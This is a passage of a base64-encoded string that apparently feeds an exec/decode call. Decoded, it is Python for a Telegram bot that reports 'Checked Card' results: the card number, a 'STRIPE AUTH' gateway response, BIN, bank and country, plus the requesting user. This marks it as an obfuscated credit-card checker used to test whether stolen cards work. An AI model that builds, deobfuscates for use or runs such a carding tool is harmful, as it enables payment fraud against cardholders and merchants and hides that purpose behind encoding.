nJlcGx5X3RvKG1lc3NhZ2UsdGV4dD1yZXNwLHBhcnNlX21vZGU9IkhUTUwiKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmVzcCA9IGYiIiIg8J2QgvCdkKHwnZCe8J2QnPCdkKTwnZCe8J2QnSDwnZCC8J2QmvCdkKvwnZCdIPCfkrMKIOKUj+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKNnwrilIPwnZCC8J2QgiA8Y29kZT57Y2N9PC9jb2RlPuKUl+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKKmwrwnZCG8J2QmvCdkK3wnZCe8J2QsPCdkJrwnZCyOiAgPGI+U1RSSVBFIEFVVEg8L2I+ICAK8J2QkfCdkJ7wnZCs8J2QqfCdkKjwnZCn8J2QrPCdkJ46ICB7bGFzdH0KICAgICAgICAK8J2QiPCdkKfwnZCf8J2QqDoge2Jpbl9udW1iZXJ9IHtjYX0K8J2QgvCdkKjwnZCu8J2Qp/CdkK3wnZCr8J2Qsjoge2NvdW50cnl9CvCdkIHwnZCa8J2Qp/CdkKQ6IHtiYW5rfQogICAgICAgIArwnZCT8J2QovCdkKbwnZCeOiB7ZXhlY3V0aW9uX3RpbWU6LjJmfSDwnZCs8J2QnvCdkJzwnZCo8J2Qp/CdkJ0KPGI+UmVxIGJ5IDo8L2I+IEB7bWVzc2FnZS5mcm9tX3VzZXIudXNlcm5hbWV9IiIiCiAgICAgICAgICAgICAgICBib3QuZWRpdF9tZXNzYWdlX3RleHQoY2hhdF9pZD1tZXNzYWdlLmNoYXQuaWQsbWVzc2FnZV9pZD1hLm1lc3NhZ2VfaWQsdGV4dD1yZXNwLHBhcnNlX21vZGU9IkhUTUwiKQogICAgICAgICAgICAKICAgICAgICAgICAgCgoKCmRlZiBydW5fYm90KCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgcHJpbnQoIlJvY2tldCBib3Qgc3RhcnRpbmciKQogICAgICAgICAgICBib3QucG9sbGluZygpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgiRXJyb3IgaW4gcm9ja2V0IGJvdCIpCgo=").decode())